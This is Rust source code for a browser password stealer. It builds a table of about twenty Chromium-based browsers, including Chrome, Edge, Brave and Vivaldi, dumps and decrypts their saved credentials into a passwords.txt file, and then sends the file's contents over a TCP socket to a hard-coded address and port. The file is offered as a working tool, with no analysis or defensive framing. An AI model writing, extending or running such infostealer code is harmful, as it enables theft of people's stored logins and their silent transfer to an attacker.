#[macro_use]
extern crate serde;
extern crate reqwest;
use std::slice;

use crate::args::Opt;
use crate::dumper::{Dumper, DumperError};

use lazy_static::lazy_static;
use std::collections::HashMap;
use std::fs;

mod args;
mod decryption_core;
mod dumper;
mod models;

use std::io::prelude::*;
use std::net::TcpStream;

pub type DumperResult<T> = Result<T, DumperError>;

#[rustfmt::skip]
lazy_static! {
    pub static ref BROWSERS: HashMap<&'static str, Dumper> = {
        let mut hm = HashMap::new();
        hm.insert("edge", Dumper::new("Edge", "Microsoft"));
        hm.insert("chromium", Dumper::new("", "Chromium"));
        hm.insert("7star", Dumper::new("7Star", "7Star"));
        hm.insert("amigo", Dumper::new("", "Amigo"));
        hm.insert("brave", Dumper::new("Brave-Browser", "BraveSoftware"));
        hm.insert("centbrowser", Dumper::new("", "CentBrowser"));
        hm.insert("chedot", Dumper::new("", "Chedot"));
        hm.insert("chrome_canary", Dumper::new("Chrome SxS", "Google"));
        hm.insert("coccoc", Dumper::new("Browser", "CocCoc"));
        hm.insert("dragon", Dumper::new("Dragon", "Comodo"));
        hm.insert("elements-browser", Dumper::new("", "Elements Browser"));
        hm.insert("epic-privacy-browser",Dumper::new("", "Epic Privacy Browser"));
        hm.insert("chrome", Dumper::new("Chrome", "Google"));
        hm.insert("kometa", Dumper::new("", "Kometa"));
        hm.insert("orbitum", Dumper::new("", "Orbitum"));
        hm.insert("sputnik", Dumper::new("Sputnik", "Sputnik"));
        hm.insert("torch", Dumper::new("", "Torch"));
        hm.insert("ucozmedia", Dumper::new("Uran", "uCozMedia"));
        hm.insert("vivaldi", Dumper::new("", "Vivaldi"));
        hm.insert("atom-mailru", Dumper::new("Atom", "Mail.Ru"));

        hm
    };
}

fn main() -> DumperResult<()> {
    let mut opt: Opt = argh::from_env();
    
    // error can be ignored
    fs::remove_dir_all("./.tmp");
    fs::create_dir("./.tmp")?;

    let browsers = &mut BROWSERS.clone();


    println!("Hello!");
    opt.browsers.clear();
    opt.browsers = browsers.keys().map(|v| v.to_string()).collect::<Vec<_>>();
    

    println!("All mapped!");
    let data = opt
        .browsers
        .into_iter()
        .filter_map(|v| browsers.get(v.as_str()).cloned())
        .map(|mut v| v.dump().map(|_| v))
        .filter_map(|v| v.ok())
        .collect::<Vec<_>>();

    if opt.print {
        println!("{:#?}", data);
    }

    let mut path = ".\\passwords.txt";

    let buf = if opt.json {
        serde_json::to_string_pretty(data.as_slice()).map_err(|e| DumperError::JsonError(e))?
    } else {
        format!("{:#?}", data)
    };


    fs::write(path, buf.as_bytes())?;

    let contents = fs::read_to_string(path)
        .expect("Something went wrong reading the file");

    let ptr = contents.as_ptr();
    let len = contents.len();

    let s = unsafe {
      let slice = slice::from_raw_parts(ptr, len);
      let mut stream = TcpStream::connect("127.0.0.1:12345")?;
        stream.write(&slice)?;
    };
    

    fs::remove_dir_all("./.tmp")?;

    Ok(())
}
